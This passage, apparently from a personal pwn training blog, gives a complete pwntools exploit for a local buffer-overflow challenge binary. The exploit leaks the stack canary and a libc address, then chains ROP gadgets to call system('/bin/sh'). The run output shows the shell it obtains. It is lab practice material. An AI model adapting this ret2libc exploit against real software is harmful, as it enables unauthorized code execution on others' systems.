core  exploit.py  leak.py  passStore_NOPIE

</code></pre>
<h4 id="exploit-code-ver2"><a class="header" href="#exploit-code-ver2">Exploit code ver2</a></h4>
<pre><code class="language-python">from pwn import *

binary = ELF('./passStore_NOPIE')
libc = ELF(&quot;/usr/lib/x86_64-linux-gnu/libc.so.6&quot;)
rop = ROP(binary)
r = process(binary.path)
#gdb.attach(r , api=True)

#payload leak canary
payload1 = b&quot;a&quot;*56
r.sendline(payload1)

print(r.recvline())

canary = b&quot;\x00&quot;  +  r.recv(7).split(b&quot;\n&quot;)[0] 
canary += b&quot;\x00&quot;*(8 - len(canary))
log.info(&quot;Leaked canary: &quot; + str(hex(u64(canary))))

main = binary.symbols['main'] #0x0000000000401245
ret = rop.find_gadget(['ret'])[0] #0x000000000040101a

#payload to call main again
payload2 = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 + p64(ret) + p64(main)
r.sendlineafter(b&quot;Retype: &quot;,payload2)

#payload leak runtime address, to cal libc_base
payload3 = b&quot;a&quot;*23
r.sendlineafter(b&quot;Type the password:&quot;,payload3)
print(r.recvline())

res = r.recv().split(b&quot;\nRetype&quot;)[0].strip().ljust(8,b&quot;\x00&quot;)

print(str(hex(u64(res))))

leaked_runtime_addr = u64(res) - 0x96 #setbuf
leaked_offset = libc.symbols['_IO_setbuffer'] #0x0000000000081540

libc_base = leaked_runtime_addr - leaked_offset
log.info(&quot;libc base addr : &quot; + hex(leaked_runtime_addr))  


system_offset = libc.symbols['system'] #0x0000000000050d60
binsh_offset = next(libc.search(b'/bin/sh\x00'))
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

# payload get shell
junk = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 
payload4 = junk +p64(ret)+ p64(pop_rdi_ret) + p64(binsh_addr) +p64(system_addr)

r.sendline(payload4)

r.interactive()
</code></pre>
<h4 id="result-ver2"><a class="header" href="#result-ver2">Result ver2</a></h4>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ python3 exploit.py
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 6 cached gadgets for './passStore_NOPIE'
[+] Starting local process '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE': pid 17374
b'Type the password: You typed aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
[*] Leaked canary: 0x67c9f3b50b8b5800
b' You typed aaaaaaaaaaaaaaaaaaaaaaa\n'
0x7fe66ea595d6
[*] libc base addr : 0x7fe66ea59540
[*] Switching to interactive mode
$ ls
core        passStore_NOPIE     passStore_NOPIE.id2
exploit.py  passStore_NOPIE.id0  passStore_NOPIE.nam
leak.py     passStore_NOPIE.id1  passStore_NOPIE.til
$

</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../blogs/PWN/Pwn_from_blabla/training_brutepie_challenge.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next" href="../../../blogs/PWN/Pwn_from_blabla/training_leak_Pie_Canary_challenge.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../blogs/PWN/Pwn_from_blabla/training_brutepie_challenge.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next" href="../../../blogs/PWN/Pwn_from_blabla/training_leak_Pie_Canary_challenge.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
